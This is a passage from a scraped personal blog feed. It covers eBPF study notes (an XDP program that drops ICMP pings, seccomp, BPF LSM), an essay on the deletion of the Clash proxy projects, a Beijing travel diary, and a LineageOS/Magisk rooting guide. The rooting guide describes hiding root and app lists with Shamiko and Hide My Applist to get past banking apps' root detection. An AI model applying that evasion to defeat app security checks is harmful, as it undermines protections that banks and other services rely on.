vmlinux.h clean: - rm $(BPF_OBJ) - rm $(TARGET) - rm find-map find-map: find-map.c gcc -Wall -o find-map find-map.c -L../libbpf/src -l:libbpf.a -lelf -lz load:\nbpftool prog load hello.bpf.o /sys/fs/bpf/hello eBPF for Networking Packet Drops An example based on bcc, which drops all received ICMP requests, run it with root privilege. NOTE: the network.h will failed to parse packets at newer kernel.\n#!/usr/bin/python3 from bcc import BPF import socket import os from time import sleep import sys b = BPF(src_file=\u0026#34;ping.bpf.c\u0026#34;) interface = \u0026#34;lo\u0026#34; # XDP will be the first program hit when a packet is received ingress fx = b.load_func(\u0026#34;xdp\u0026#34;, BPF.XDP) BPF.attach_xdp(interface, fx, 0) try: b.trace_print() except KeyboardInterrupt: sys.exit(0) #include \u0026#34;network.h\u0026#34; #include \u0026lt;bcc/proto.h\u0026gt; #include \u0026lt;linux/pkt_cls.h\u0026gt; int xdp(struct xdp_md *ctx) { void *data = (void *)(long)ctx-\u0026gt;data; void *data_end = (void *)(long)ctx-\u0026gt;data_end; if (is_icmp_ping_request(data, data_end)) { bpf_trace_printk(\u0026#34;Got ping packet\u0026#34;); return XDP_DROP; } return XDP_PASS; } XDP Offloading: run eBPF programs on a network card to make decisions about individual packets before they even reach the kernel’s networking stack\nLoad Balancing and Forwarding omit\nTraffic Control eBPF programs attached within the TC subsystem receive a pointer to the sk_buff structure as the context parameter, which happens after XDP hook, and so XDP programs dont use the same structure for their context.\nThe TC subsystem is intended to regulate how network traffic is scheduled.\nomit\nPacket Encryption and Decryption example\neBPF and Kubernetes Networking avoid iptables to improve performance network policy enforcement encrypted connections (offload the encryption requirement from application, either to a service mesh layer or to the underlying network itself) eBPF for Security Using System Calls for Security Events use seccomp-bpf to filter the syscalls that are and aren\u0026rsquo;t allowed record the set of syscalls an application makes, and generate a seccomp profile to restrict container activities. syscall traching : Falco BPF LSM The LSM interface provides a set of hooks that each occur just before the kernel is about to act on a kernel data structure. The function called by a hook can make a decision about whether to allow the action to go ahead.\n","permalink":"https://ch3n9w.github.io/posts/tech-learning-ebpf/","summary":"\u003cp\u003eeBPF 是一项革命性的技术, 起源于Linux 内核, 它可以在特权上下文中(如操作系统内核)运行沙盒程序. 它用于安全有效地扩展内核的功能, 而无需通过更改内核源代码或加载内核模块的方式来实现. 从历史上看,由于内核具有监督和控制整个系统的特权,操作系统一直是实现可观测性, 安全性和网络功能的理想场所.\u003c/p\u003e\n\u003cp\u003e对ebpf慕名许久, 正好趁寒假拜读一下Learning eBPF, 虽然是基于略过时的框架bcc, 但是在这个过程中学到的知识想必依旧可以迁移到别的框架去.\u003c/p\u003e\n\u003ch2 id=\"background-and-pre-knowledge\"\u003eBackground and pre-knowledge\u003c/h2\u003e\n\u003ch3 id=\"bcc\"\u003ebcc\u003c/h3\u003e\n\u003cp\u003ebcc的ebpf c代码不是真正的C, 而是bcc自己定义的一种和C类似的语言.\u003c/p\u003e\n\u003ch3 id=\"limitation-of-ebpf-program\"\u003elimitation of ebpf program\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eeBPF 程序必须被验证器校验通过后才能执行，且不能包含无法到达的指令；\u003c/li\u003e\n\u003cli\u003eeBPF 程序不能随意调用内核函数，只能调用在 API 中定义的辅助函数；\u003c/li\u003e\n\u003cli\u003eeBPF 程序栈空间最多只有 512 字节，想要更大的存储，就必须要借助映射存储；\u003c/li\u003e\n\u003cli\u003e在内核 5.2 之前，eBPF 字节码最多只支持 4096 条指令，而 5.2 内核把这个限制提高到了 100 万条；\u003c/li\u003e\n\u003cli\u003e由于内核的快速变化，在不同版本内核中运行时，需要访问内核数据结构的 eBPF 程序很可能需要调整源码，并重新编译。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"tracepoint-and-kprobe\"\u003etracepoint and kprobe\u003c/h3\u003e\n\u003cp\u003etracepoint其实就是在Linux内核的一些关键函数中埋下的hook点,这样在tracing的时候,我们就可以在这些固定的点上挂载调试的函数,然后查看内核的信息.\u003c/p\u003e\n\u003cp\u003eTracepoint是在内核中固定的hook点, 并不是在所有的函数中都有tracepoint. 这时候, 我们就需要用到kprobe了. kprobe可以动态地在所有的内核函数(除了inline函数)上挂载probe函数\u003c/p\u003e\n\u003ch3 id=\"ebpf-virtual-machine\"\u003eeBPF virtual machine\u003c/h3\u003e\n\u003cp\u003eThe ebpf virtual machine uses 10 general-purpose registers (0-9), and additional register 10 which was used as a stack frame pointer (can only be read but not written). As a BPF program is executed, \u003cstrong\u003evalues get stored in these registers to keep track of state.\u003c/strong\u003e\u003c/p\u003e","title":"Learning eBPF"},{"content":"2023年11初,简中互联网又发生了一出闹剧,不过于以往的过眼云烟所不同的是,这次的事件导致了一系列优秀开源软件的消亡.\n起因 事件的经过其实并不复杂.11.2,clash for windows 的作者删除了github上用于发布的仓库中的信息,并在个人telegram频道上宣布不再开发.由于cfw的操作简单,对小白友好,因此其用户数量相当之大.删库的消息出来后,网友们纷纷开始关注作者的社交账号,对是否因信息泄露导致被抓加以猜测.其实对于一个网络代理软件来说,无论是因为被请喝茶还是因为作者不想干了而删库都是一件很正常的事情.\n如果事情仅仅到这里就结束,那么大家顶多也就感慨一句过去说烂了的那些话,甚至对于开源主义者来说连感慨都没有,因为cfw本身就是一个闭源软件,而github仅仅是用来发布二进制包的.\n但是事情没有那么简单.\nclash for windows是基于开源的clash core核心代码做的图形化客户端工具,而该核心代码同样是一系列类似软件（例如clash x, clash meta）的基础组件.或许是出于对clash core作者的尊重,这些项目的名称中也都包含了clash字样.\n通常情况下,开发者并不会在意自己的软件被普通用户和其他clash相关软件搞混.而对于cfw用户,尤其是其中的小白用户来说,他们中的大部分仅仅接触过cfw,因此在口口相传中会自然而然地将clash这个有特征的词作为clash for windows的指代以节约沟通成本,cfw是clash, clash是cfw.\n因此,cfw被删库后,消息通过互联网在用户群体之间开始广泛传播开来,很快就演变为了下面这张图上的消息.\n假消息只是第一步.对于大部分cfw的用户来说,他们似乎并不知道此种软件的敏感程度和软件作者所面临的风险,他们只是在盲目地在各大社交媒体上发问,而很遗憾却也意料之中的,这其中,包括了微博.\n前面提到,cfw的低门槛为它带来了众多的用户,而现在,这些用户将成为压死所有clash相关项目的稻草.由于提问和吃瓜的人太多,相关话题的热度不断上升,该话题很快出现在了微博的热搜上.\n于是事情失控了.\n结果 11月3号,出于对自身安全的考虑,几乎所有clash相关软件作者,包括clash内核项目作者,集体将代码库删除.一个持续了数年,帮助到许多网民的软件,却因为网民们的无知,在一天之间内尽数消亡.整个过程实在太快,快得根本不像有关部门的有组织行动.因为驱使项目消亡的,仅仅只是网民们的狂欢,和开源作者们的恐惧.\n而可悲的是,在删库时间结束后,clash在微博的话题热度更高了,是的,没有人关心项目作者是否会因为这场风波而被捕入狱,他们只想四处打听,吃瓜,并迫切地希望看到血流成河. 一直到现在, 有关话题在telegram上还在被持续不断的争论中, 其中跳出了一些人来试图通过捏造事实抹黑多位作者来洗脱自身的责任.\n可笑的是,当被要求放出对应的项目时,此人开始转移话题,并且在他臆想的情况下,对作者进行了人身攻击.\n可悲的是,这种人在这场风波中并不少见,他们不仅仅是无知,更是无耻.\n教训 其实单纯责怪用户并没有什么意义,毕竟像cfw这样方便的软件,其用户群体是鱼龙混杂的,要求他们集体提升相关的意识也是不现实的,所以很遗憾,尽管我们可以斥责部分的微博用户,但是归根到底,如何改变此类软件尤其是开源软件的危险现状,作者该做出什么样的改变来更好地保护自己,才是更有现实意义的话题.\n具体来说, 对我而言, 除非开源软件合法合规,否则:\n不要做windows平台下的软件 不要在项目中包含简体中文说明 不要取朗朗上口好记的项目名 控制推广范围,就是对作者最大的保护 尽管以上措施会限制软件的使用范围,但是对于此类软件来说,开发者的人身安全才是第一位的.\n只是,这些教训,对于已经消亡的项目来说,已经太迟了.\n参考 https://github.com/net4people/bbs/issues/303 https://www.eaimty.com/2023/opensource-project-based-on-hormone/\n","permalink":"https://ch3n9w.github.io/posts/gossip-rip-clash/","summary":"\u003cp\u003e2023年11初,简中互联网又发生了一出闹剧,不过于以往的过眼云烟所不同的是,这次的事件导致了一系列优秀开源软件的消亡.\u003c/p\u003e\n\u003ch2 id=\"起因\"\u003e起因\u003c/h2\u003e\n\u003cp\u003e事件的经过其实并不复杂.11.2,clash for windows 的作者删除了github上用于发布的仓库中的信息,并在个人telegram频道上宣布不再开发.由于cfw的操作简单,对小白友好,因此其用户数量相当之大.删库的消息出来后,网友们纷纷开始关注作者的社交账号,对是否因信息泄露导致被抓加以猜测.其实对于一个网络代理软件来说,无论是因为被请喝茶还是因为作者不想干了而删库都是一件很正常的事情.\u003c/p\u003e\n\u003cp\u003e如果事情仅仅到这里就结束,那么大家顶多也就感慨一句过去说烂了的那些话,甚至对于开源主义者来说连感慨都没有,因为cfw本身就是一个闭源软件,而github仅仅是用来发布二进制包的.\u003c/p\u003e\n\u003cp\u003e但是事情没有那么简单.\u003c/p\u003e\n\u003cp\u003eclash for windows是基于开源的clash core核心代码做的图形化客户端工具,而该核心代码同样是一系列类似软件（例如clash x, clash meta）的基础组件.或许是出于对clash core作者的尊重,这些项目的名称中也都包含了clash字样.\u003c/p\u003e\n\u003cp\u003e通常情况下,开发者并不会在意自己的软件被普通用户和其他clash相关软件搞混.而对于cfw用户,尤其是其中的小白用户来说,他们中的大部分仅仅接触过cfw,因此在口口相传中会自然而然地将clash这个有特征的词作为clash for windows的指代以节约沟通成本,cfw是clash, clash是cfw.\u003c/p\u003e\n\u003cp\u003e因此,cfw被删库后,消息通过互联网在用户群体之间开始广泛传播开来,很快就演变为了下面这张图上的消息.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"photo_2023-11-04_10-17-56.jpg\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e假消息只是第一步.对于大部分cfw的用户来说,他们似乎并不知道此种软件的敏感程度和软件作者所面临的风险,他们只是在盲目地在各大社交媒体上发问,而很遗憾却也意料之中的,这其中,包括了微博.\u003c/p\u003e\n\u003cp\u003e前面提到,cfw的低门槛为它带来了众多的用户,而现在,这些用户将成为压死所有clash相关项目的稻草.由于提问和吃瓜的人太多,相关话题的热度不断上升,该话题很快出现在了微博的热搜上.\u003c/p\u003e\n\u003cp\u003e于是事情失控了.\u003c/p\u003e\n\u003ch2 id=\"结果\"\u003e结果\u003c/h2\u003e\n\u003cp\u003e11月3号,出于对自身安全的考虑,几乎所有clash相关软件作者,包括clash内核项目作者,集体将代码库删除.一个持续了数年,帮助到许多网民的软件,却因为网民们的无知,在一天之间内尽数消亡.整个过程实在太快,快得根本不像有关部门的有组织行动.因为驱使项目消亡的,仅仅只是网民们的狂欢,和开源作者们的恐惧.\u003c/p\u003e\n\u003cp\u003e而可悲的是,在删库时间结束后,clash在微博的话题热度更高了,是的,没有人关心项目作者是否会因为这场风波而被捕入狱,他们只想四处打听,吃瓜,并迫切地希望看到血流成河. 一直到现在, 有关话题在telegram上还在被持续不断的争论中, 其中跳出了一些人来试图通过捏造事实抹黑多位作者来洗脱自身的责任.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"normal.png\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e可笑的是,当被要求放出对应的项目时,此人开始转移话题,并且在他臆想的情况下,对作者进行了人身攻击.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"attack.png\" alt=\"\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e可悲的是,这种人在这场风波中并不少见,他们不仅仅是无知,更是无耻.\u003c/p\u003e\n\u003ch2 id=\"教训\"\u003e教训\u003c/h2\u003e\n\u003cp\u003e其实单纯责怪用户并没有什么意义,毕竟像cfw这样方便的软件,其用户群体是鱼龙混杂的,要求他们集体提升相关的意识也是不现实的,所以很遗憾,尽管我们可以斥责部分的微博用户,但是归根到底,如何改变此类软件尤其是开源软件的危险现状,作者该做出什么样的改变来更好地保护自己,才是更有现实意义的话题.\u003c/p\u003e\n\u003cp\u003e具体来说, 对我而言, 除非开源软件合法合规,否则:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e不要做windows平台下的软件\u003c/li\u003e\n\u003cli\u003e不要在项目中包含简体中文说明\u003c/li\u003e\n\u003cli\u003e不要取朗朗上口好记的项目名\u003c/li\u003e\n\u003cli\u003e控制推广范围,就是对作者最大的保护\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e尽管以上措施会限制软件的使用范围,但是对于此类软件来说,开发者的人身安全才是第一位的.\u003c/p\u003e\n\u003cp\u003e只是,这些教训,对于已经消亡的项目来说,已经太迟了.\u003c/p\u003e\n\u003ch2 id=\"参考\"\u003e参考\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/net4people/bbs/issues/303\"\u003ehttps://github.com/net4people/bbs/issues/303\u003c/a\u003e\n\u003ca href=\"https://www.eaimty.com/2023/opensource-project-based-on-hormone/\"\u003ehttps://www.eaimty.com/2023/opensource-project-based-on-hormone/\u003c/a\u003e\u003c/p\u003e","title":"RIP Clash"},{"content":" 与所爱之人在一起的时光, 会生出互相的珍惜, 这份珍惜犹如风筝线一般, 即便对方远在云端, 依旧可以感知到其心念所动, 于是思念由此而生.\n在yq成功上岸家乡的教师编后, 为了庆祝, 也为了缓解许久未见的相思之苦, 我匆忙计划了一下行程, 一边让她订来北京的车票, 一边思考附近哪里有卖香槟的.\n颐和园 选择颐和园, 是因为离信工所比较近. 当日原本想带yq去我平时去的早餐店, 可惜我们出发之时, 已是中午十二点了, 于是带她吃之前推荐过的意大利沙县萨莉亚. 这是一个价格非常亲民的意大利西餐厅, 看了看菜单上十几二十元的菜品后, 我们彻底放下了对价格的顾虑, 仅仅考虑口味和胃口. 实际上这家店的口味确实不错, 特别是蘑菇浓汤, 虽然肯定不能说顶级, 但这种不用顾虑价格就享受西餐的轻松感, 独此一份 (说白了还是太穷).\n阳光正好, 晒在身上暖洋洋的. 我们在下公交之后, 慢慢悠悠前往颐和园的入口, 路上落叶飞舞, 却无半点萧条, 行人来来往往, 一个婴儿车里的小孩指着另一个在妈妈自行车车筐里的小孩羡慕地哇哇直叫, 惹得两边的家长忍俊不禁. 走走停停之间, 我们时而在路边的亭子里歇脚, 时而在红砖绿瓦的不知名府门前驻足拍照, 心下一片闲适.\n进入颐和园后才发现这里出乎意料的大, 但想想这毕竟是皇帝的游玩之地, 倒也算合理. 我们绕过威武的麒麟像, 路过皇帝慈禧临时听政的仁寿宫和一棵棵百年龙柏, 穿过城关, 来到谐趣园. 因为是秋天的缘故, 尽管气温并不让人觉得有秋意, 但是池中的荷花已经尽数枯萎, 风光不再, 宛如那个死去多时的王朝. 沿着回廊行走, 我恼于这行走的空间竟然如此狭窄, 古代的皇帝不与人并肩行走, 其他的人只能尾随, 因此凡是走廊一类的地方都可以设计地窄小一些, 只是我不禁开始无端思考, 长期地处于这样的空间里, 人的心胸眼界是否也会变得狭小呢?\n一路上看到了许多格格打扮的女生在凹造型拍照, 纸扇轻摇, 回眸一笑, 气质优雅, 恬静端庄, 只是都没有我的身边人这般可爱.\n来到苏州街, 我和yq沿河而行, 小心路过一间间无人的商铺. 昔日皇帝为在此重现江南风情, 仿照水镇在此地建造了买卖街, 专供宫中人游览, 即所谓\u0026quot;宫市\u0026quot;. 这个地方1860被列强烧毁, 一百多年后才由共和国重建, 然而我对此类皇室娱乐并不感冒, 只是紧张地一遍遍提醒不停拍照的yq小心别把手机丢进河里.\n绕了一圈苏州街出来, 迎面就是依山而建的四大部洲建筑群, 拾级而上, 可以看见一处广场, 上有27个圆形底座, 我们一边猜测其用途, 一边继续向上, 看见了许多藏族风格的宏伟建筑, 心念一动, 原来那个地方是用来给僧人打坐用的啊. 只是可惜没有力气再往上了, 便下了山.\n由于之前错过了几处收费的景点, 我们一边忍着脚痛, 一边原路返回, 好在不是很远, 便抵达了德和园. 这里是皇帝和大臣们看戏剧的地方, 围绕着两层楼的戏台有一张张桌椅, 是大臣被邀请来观赏时的座位, 而皇帝则坐在正对着戏台的室内观看. 我看了看那普普通通的椅子, 坐上去几个小时应该不是什么很享受的体验. 因为之前走累了, 我们便坐在戏台前的台阶上玩会手机, 相互依靠的时候稍解了疲劳.\n由于时间有限, 有很多景点没能观赏, 只能抱着遗憾和夕阳离开了.\n后海 与本科同学去过一次后海, 对那边有比较好的印象, 于是趁此机会带着yq去了. 在后海公园散步的时候, 我们看到了一个画人像画得很好的大爷, yq缠着我想让他给我们画双人像, 直到发现前面还有很多人排队的时候才作罢. 一路上又经过一个卖外国钱币的小摊, 面前摆着一大盆各国钱币, 随便拿一个老板都能说出其所属国家和该国的些许历史, 令人佩服. 我本来并没有兴趣, 只是帮着yq在旁边挑些好看的钱币, 直到忽然看到一个上面印着镰刀锤子图案的硬币, 这里竟然苏联的钱币都有, 赶紧买了一个, 刚买完旁边又有一个男生来问老板有没有苏联解体前的硬币, 心想果然共和国的男人都喜欢苏联.\n后海那边有许多酒吧与驻唱歌手, 我们听一听, 看一看, 走一走, 在路边的各种文创店和电玩店之间穿梭 (这地方为什么有这么多电玩店?) . 不知不觉就到了晚饭时间, 我们沿着去地铁的路, 钻进了小巷, 摆脱了街上熙熙攘攘的人流, 左转右转, 偶遇一家炸酱面馆, 门前大爷啤酒面条, 热热闹闹, 好不快活. 出于好奇, 我们也进去吃了一碗, 价格实惠, 味道也不错, 或许更吸引我们的, 是这里的烟火气息吧. 只是出了小店后, 没走五六米, 忽然发现另一家炸酱面店, 这家店门口的超长队伍让我们惊讶不已: 不过是一家在巷子中的面店, 至于这么\u0026quot;兴师动众\u0026quot;吗? 可惜已经吃过了, 只好先行离开, 来日有机会试试.\n走着走着, 从黄昏走到黑夜, 从小巷的这头走到那头, 从现代化的街道走到简陋的老宅边. 昏黄的灯光亮起, 头顶的电线投下了交错的影子. 我们手牵着手, 从喧嚣的人群走到安静的猫儿身边, yq想拍个巷子里的照片, 对它说: \u0026ldquo;嘿猫猫, 看这里\u0026rdquo;, 猫咪好奇地转过头, 于是美好被定格在了照片中.\n后记 路上我一直在思考, 到底什么样的人值得一个更好的未来, 是更自私, 更势利, 更善于伪装自己来迎合别人却在利用完别人之后态度瞬间发生180度转弯爱搭不理的人? 还是更冷漠, 不停排除异己, 眼中只有自己和所属的小圈子的人? 我并不知道, 我只知道我身边的女孩, 在经历过一次次地痛苦, 沮丧和无奈后, 依然被爱她的人坚定不移地选择着, 支持着并拥抱着, 而她也没有辜负自己所曾经遭受过的苦难, 没有变得更加的\u0026quot;成熟\u0026quot;, 而是保持善良, 一步一步缓慢但坚定不移地向着一个让我们有所期待的未来前进着.\n","permalink":"https://ch3n9w.github.io/posts/gossip-beijing-travel-2023-2/","summary":"\u003cblockquote\u003e\n\u003cp\u003e与所爱之人在一起的时光, 会生出互相的珍惜, 这份珍惜犹如风筝线一般, 即便对方远在云端, 依旧可以感知到其心念所动, 于是思念由此而生.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e在yq成功上岸家乡的教师编后, 为了庆祝, 也为了缓解许久未见的相思之苦, 我匆忙计划了一下行程, 一边让她订来北京的车票,  一边思考附近哪里有卖香槟的.\u003c/p\u003e\n\u003ch2 id=\"颐和园\"\u003e颐和园\u003c/h2\u003e\n\u003cp\u003e选择颐和园, 是因为离信工所比较近. 当日原本想带yq去我平时去的早餐店, 可惜我们出发之时, 已是中午十二点了, 于是带她吃之前推荐过的意大利沙县萨莉亚. 这是一个价格非常亲民的意大利西餐厅, 看了看菜单上十几二十元的菜品后, 我们彻底放下了对价格的顾虑, 仅仅考虑口味和胃口. 实际上这家店的口味确实不错, 特别是蘑菇浓汤, 虽然肯定不能说顶级, 但这种不用顾虑价格就享受西餐的轻松感, 独此一份 (说白了还是太穷).\u003c/p\u003e\n\u003cp\u003e阳光正好, 晒在身上暖洋洋的. 我们在下公交之后, 慢慢悠悠前往颐和园的入口, 路上落叶飞舞, 却无半点萧条, 行人来来往往, 一个婴儿车里的小孩指着另一个在妈妈自行车车筐里的小孩羡慕地哇哇直叫, 惹得两边的家长忍俊不禁. 走走停停之间, 我们时而在路边的亭子里歇脚, 时而在红砖绿瓦的不知名府门前驻足拍照, 心下一片闲适.\u003c/p\u003e\n\u003cp\u003e进入颐和园后才发现这里出乎意料的大, 但想想这毕竟是皇帝的游玩之地, 倒也算合理. 我们绕过威武的麒麟像, 路过皇帝慈禧临时听政的仁寿宫和一棵棵百年龙柏, 穿过城关, 来到谐趣园. 因为是秋天的缘故, 尽管气温并不让人觉得有秋意, 但是池中的荷花已经尽数枯萎, 风光不再, 宛如那个死去多时的王朝. 沿着回廊行走, 我恼于这行走的空间竟然如此狭窄, 古代的皇帝不与人并肩行走, 其他的人只能尾随, 因此凡是走廊一类的地方都可以设计地窄小一些, 只是我不禁开始无端思考, 长期地处于这样的空间里, 人的心胸眼界是否也会变得狭小呢?\u003c/p\u003e\n\u003cp\u003e一路上看到了许多格格打扮的女生在凹造型拍照, 纸扇轻摇, 回眸一笑, 气质优雅, 恬静端庄, 只是都没有我的身边人这般可爱.\u003c/p\u003e\n\u003cp\u003e来到苏州街, 我和yq沿河而行, 小心路过一间间无人的商铺. 昔日皇帝为在此重现江南风情, 仿照水镇在此地建造了买卖街, 专供宫中人游览, 即所谓\u0026quot;宫市\u0026quot;. 这个地方1860被列强烧毁, 一百多年后才由共和国重建, 然而我对此类皇室娱乐并不感冒, 只是紧张地一遍遍提醒不停拍照的yq小心别把手机丢进河里.\u003c/p\u003e","title":"2023 记北京秋游"},{"content":" 2024年7月更新: 经过了半年的时候, 遇到的问题包括但不限于 1) 微信卡顿 2) 银行类app无法使用 3) system UI经常崩溃 4) 快充消失. 出于可用性考虑, 已经转回coloros\n2024年2月更新: Lsposed连同一系列root隐藏模块已经归档无法使用, 为了方便日常使用, 建议卸载magisk, 刷机的时代已经过去了.\n不知道从什么时候开始, 往日被冠以高可玩性高自由度的安卓系统逐渐变得封闭, 一步步沦为资本市场的玩物和工具. MIUI也好, ColorOS也罢, 用户总能在使用系统的过程中发现一些去也去不掉的应用和小程序, 看到一些不想看也得看的广告, 而起初, 有些人尽管对此有所不满, 但基本都选择容忍的态度, 但这几年国内的趋势越来越不对劲: 先是某APP在全社会的宣传下或软性或硬性地被安装在了相当大一部分人的手机中监控个人信息(当然, 我理解打击诈骗行为, 保护平民百姓的钱包远比软件自由重要得多), 又是拼多多被爆出利用安卓手机的0day漏洞在所有用户的手机上进行多种恶意行为, 一直到最近, 一则某信部的发文通知将这种 我的手机不归我管 的焦虑感推向了新的高潮.\n就目前来看, 这则通知的社会反响并不强烈, 不出意外应该可以顺利推行. 之后最直观的效果就是所有使用国内安卓系统的用户都只能安装指定的app, 不再具备安装推特等软件的能力, 这无异于干掉了安卓最大的特点, 使其沦落为全方位落后于苹果的手机系统. 作为一个经历过安卓app爆发式增长年代的玩家, 我很好奇现在新接触到手机的用户对自己掌中的设备是一个什么样的印象, 是一个拥有无限可能的工具? 还是一个用低质量内容, 广告和充满限制的操作系统来无限吸收注意力, 获取个人隐私并变相管理个人精神世界的资本和政府工具?\n万幸的是, 安卓的开源属性为它保留下了一些自由的火种, 那边是第三方rom. 本文主要记录自己安装 lineageos, magisk, Lsposed 以及一些有用软件的过程.\n购买机器 查看lineageos支持的设备列表, 出于对一加的偏好和对骁龙888发热的不放心, 我选择以一加8pro作为自己的新设备. 在咸鱼上逛了很久, 筛掉一大批机器贩子和低质量卖家后, 我看中了一位宝妈的二手机并下单. 机器到手后我非常满意, 因为成色实在是很好, 连维修店里给我手机换电池的工程师也赞叹保养得不错, 这1700虽然有点贵, 但还是值得的.\nLineageos 这一步我没有什么需要补充的, 只需要按照 lineageos的wiki一步一步来就可以, 不要跳步, 仔细慢慢操作. 注意要按照自己支持的机型的wiki操作就行.\nmagisk 按照 https://magiskcn.com/oneplus-magisk 中的第七步安装magisk app, 然后使用在安装lineageos时候下载的boot.img 去操作接下来的步骤, 重启就可以了.\n接下来介绍几个我觉得比较有用的模块\nShamiko 安装完magisk之后, 部分APP(金融类和通信类)会因为检测到root环境而直接退出, 为了避免这些问题, 我们需要按照一个可以隐藏root环境的模块来让他们正常工作.\n按照 https://magiskcn.com/shamiko-install 里面的操作安装shamiko模块, 启动闪退的APP看看能不能正常启动 (中国移动可以启动的话就没问题)\nLSPosed 按照 官网指示 安装即可. 接下来介绍一下我使用的模块\nAD快消 去除那些国产软件开屏时候的牛皮藓广告, 注意这可能会让某些APP无法启动, 遇到这种情况不要让该模块作用于这些APP就行.\nWeXposed (微X) 很实用的微信增强模块\nHide My Applist 隐藏APP列表中的某些APP, 用于隐藏一些不想让别人看到的Applist, 用于绕过某些APP(例如工商银行)的检测\nhttps://magiskcn.com/hide-my-applist\n其他软件 Revanced 去除Youtube的限制, 解锁后台播放等功能.\n下载 https://github.com/j-hc/revanced-magisk-module/releases/ 中的youtube-revanced.apk然后安装, 启动后按照指示安装microG框架就可以使用了\n","permalink":"https://ch3n9w.github.io/posts/tech-lineageos-md/","summary":"\u003cblockquote\u003e\n\u003cp\u003e2024年7月更新: 经过了半年的时候, 遇到的问题包括但不限于 1) 微信卡顿 2) 银行类app无法使用 3) system UI经常崩溃 4) 快充消失. 出于可用性考虑, 已经转回coloros\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e2024年2月更新: Lsposed连同一系列root隐藏模块已经归档无法使用, 为了方便日常使用, 建议卸载magisk, 刷机的时代已经过去了.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cp\u003e不知道从什么时候开始, 往日被冠以高可玩性高自由度的安卓系统逐渐变得封闭, 一步步沦为资本市场的玩物和工具. MIUI也好, ColorOS也罢, 用户总能在使用系统的过程中发现一些去也去不掉的应用和小程序, 看到一些不想看也得看的广告, 而起初, 有些人尽管对此有所不满, 但基本都选择容忍的态度, 但这几年国内的趋势越来越不对劲: 先是某APP在全社会的宣传下或软性或硬性地被安装在了相当大一部分人的手机中监控个人信息(当然, 我理解打击诈骗行为, 保护平民百姓的钱包远比软件自由重要得多), 又是拼多多被爆出利用安卓手机的0day漏洞在所有用户的手机上进行多种恶意行为, 一直到最近, 一则某信部的发文通知将这种 \u003ccode\u003e我的手机不归我管\u003c/code\u003e 的焦虑感推向了新的高潮.\u003c/p\u003e\n\u003cp\u003e就目前来看, 这则通知的社会反响并不强烈, 不出意外应该可以顺利推行. 之后最直观的效果就是\u003cstrong\u003e所有使用国内安卓系统的用户都只能安装指定的app, 不再具备安装推特等软件的能力\u003c/strong\u003e, 这无异于干掉了安卓最大的特点, 使其沦落为全方位落后于苹果的手机系统. 作为一个经历过安卓app爆发式增长年代的玩家, 我很好奇现在新接触到手机的用户对自己掌中的设备是一个什么样的印象, 是一个拥有无限可能的工具? 还是一个用低质量内容, 广告和充满限制的操作系统来无限吸收注意力, 获取个人隐私并变相管理个人精神世界的资本和政府工具?\u003c/p\u003e\n\u003cp\u003e万幸的是, 安卓的开源属性为它保留下了一些自由的火种, 那边是第三方rom. 本文主要记录自己安装 lineageos, magisk, Lsposed 以及一些有用软件的过程.\u003c/p\u003e\n\u003ch2 id=\"购买机器\"\u003e购买机器\u003c/h2\u003e\n\u003cp\u003e查看\u003ca href=\"https://wiki.lineageos.org/devices/\"\u003elineageos支持的设备列表\u003c/a\u003e, 出于对一加的偏好和对骁龙888发热的不放心, 我选择以一加8pro作为自己的新设备. 在咸鱼上逛了很久, 筛掉一大批机器贩子和低质量卖家后, 我看中了一位宝妈的二手机并下单. 机器到手后我非常满意, 因为成色实在是很好, 连维修店里给我手机换电池的工程师也赞叹保养得不错, 这1700虽然有点贵, 但还是值得的.\u003c/p\u003e","title":"lineageos使用体验"},{"content":" 乱世之中, 唯有自我与我所爱值得珍惜\n很久以来我一直在思考一个问题,为什么对于别的技术型职业,例如医生,教师,高级技工,裁缝,厨师,从业者的从业时间越长越吃香,而唯独中国程序员深陷于35岁魔咒之中.抛去国内劳动力市场扭曲的供求关系,还有一个经常为人所忽视的原因是最佳技术选型尚处于迭代之中.\n与其他行业漫长的发展历史相比,计算机行业是一个\u0026quot;小年轻\u0026quot;,而其下属的软件行业更是初生牛犊.理工农医,文史哲艺,经管法教,每一门学科都发展了百年以上,其中一些的历史更是与人类文明史一般漫长.反观计算机行业,现代计算机的理念是由图灵在1936年提出的,而第一台可编程通用计算机则是在1945年出现的.这仅仅只是一个开始,由于行业的特殊性,直到1978年x86架构出现以及1973年C语言出现,软件行业才算是开始发展.如此算来,当代如日中天人人羡艳的程序员行业,仅仅只有五十多岁,比我们的爷爷奶奶辈都要年轻不少.如此年轻的行业,势必还有很大的提升空间.\n另外,软件行业的发展也随时受硬件发展的影响,20年前寸土寸金的内存在今天已经不再成为用户使用的瓶颈,那些为了充分利用内存而想出的奇思妙想也不再为人所津津乐道.硬件成了绝大部分软件开发任务中最低廉的成本,而人力成本占的比重则越来越高,这也是为什么诸如Electron之类的框架能够大行其道.这只是硬件影响软件的案例中影响比较小的案例,其他的硬件变革,例如苹果Arm架构对传统x86架构的冲击,苹果共享内存在人工智能领域对英伟达的优势,乃至于可能出现的量子计算机,都正在对软件行业产生持续性的影响,而这些影响所能带来什么样的改变,目前还说不好,毕竟计算机是一个相当年轻的行业,连硬件都没有达到公认最优的状态(架构,指令集,容量,寿命等等),更何况是在此基础上的软件行业呢?\n哪怕是抛开硬件变化的影响不谈,软件领域内部也在不停更迭中.\n论编程语言,不说typescript,coffeescript这些在javascript基础上发展的语言,且说golang和rust两位抛弃面向对象的后起之秀已经开始凭借它们优秀的设计分别在业务领域和基础设施领域逐渐蚕食java和c++的份额,后两者由于拥有成熟的生态和大量的已有实践导致开发者经常陷入编程语言的选择困难症,在此基础上还衍生出了各种编程语言宗